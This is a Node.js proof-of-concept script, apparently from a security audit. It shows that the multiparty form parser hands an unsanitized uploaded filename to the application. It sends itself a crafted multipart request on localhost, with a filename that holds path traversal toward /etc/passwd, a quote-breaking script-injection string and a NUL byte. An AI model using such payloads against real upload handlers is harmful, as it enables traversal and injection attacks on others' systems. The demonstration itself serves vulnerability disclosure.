// multiparty — MP-01: unsanitized filename exposure.
// multipart/form-data parser — sends a crafted Content-Disposition
// with a path-traversal filename, and observes that the value reaches
// the application callback unchanged.
const multiparty = require("multiparty");
const http = require("http");

const PORT = 5556;

const CRLF = "\r\n";
const BOUNDARY = "----LabBoundary12345";

function buildEvilBody() {
  // Filename contains: directory traversal + quotes + newlines (for
  // reflected-XSS context) + NUL byte.
  const evilName = `../../etc/passwd";alert(1);//\u0000NUL.png`;
  const parts = [
    `--${BOUNDARY}`,
    `Content-Disposition: form-data; name="upload"; filename="${evilName}"`,
    `Content-Type: image/png`,
    ``,
    `PNG-fake-content`,
    `--${BOUNDARY}--`,
    ``,
  ];
  return parts.join(CRLF);
}

const server = http.createServer((req, res) => {
  const form = new multiparty.Form();
  const filenames = [];
  form.on("part", (part) => {
    if (part.name === "upload") {
      filenames.push({
        name: part.name,
        filename: part.filename,           // raw value from Content-Disposition
        filename_decoded: JSON.stringify(part.filename),
      });
    }
    part.resume();
  });
  form.on("close", () => {
    console.log("multiparty PoC — version:", require("multiparty/package.json").version);
    console.log("filenames as seen by the application:");
    for (const f of filenames) {
      console.log("  ", JSON.stringify(f, null, 2));
    }
    const hasTraversal = filenames.some((f) => String(f.filename).includes(".."));
    const hasInjection = filenames.some((f) => /[";\n\r\\]/.test(String(f.filename)));
    if (hasTraversal || hasInjection) {
      console.log("\n  >>> MP-01 CONFIRMED: filename is exposed without sanitization <<<");
      console.log("      (consuming code that uses it in a path/HTML/header sinks vulnerable)");
    }
    res.writeHead(200, { "Content-Type": "application/json" });
    res.end(JSON.stringify({ ok: true }));
    server.close();
    process.exit(hasTraversal || hasInjection ? 0 : 1);
  });
  form.parse(req);
});

server.listen(PORT, "127.0.0.1", () => {
  console.log(`[+] multiparty server listening on http://127.0.0.1:${PORT}`);
  const body = buildEvilBody();
  const req = http.request({
    host: "127.0.0.1", port: PORT, method: "POST",
    headers: {
      "Content-Type": `multipart/form-data; boundary=${BOUNDARY}`,
      "Content-Length": Buffer.byteLength(body),
    },
  }, () => {});
  req.write(body);
  req.end();
});
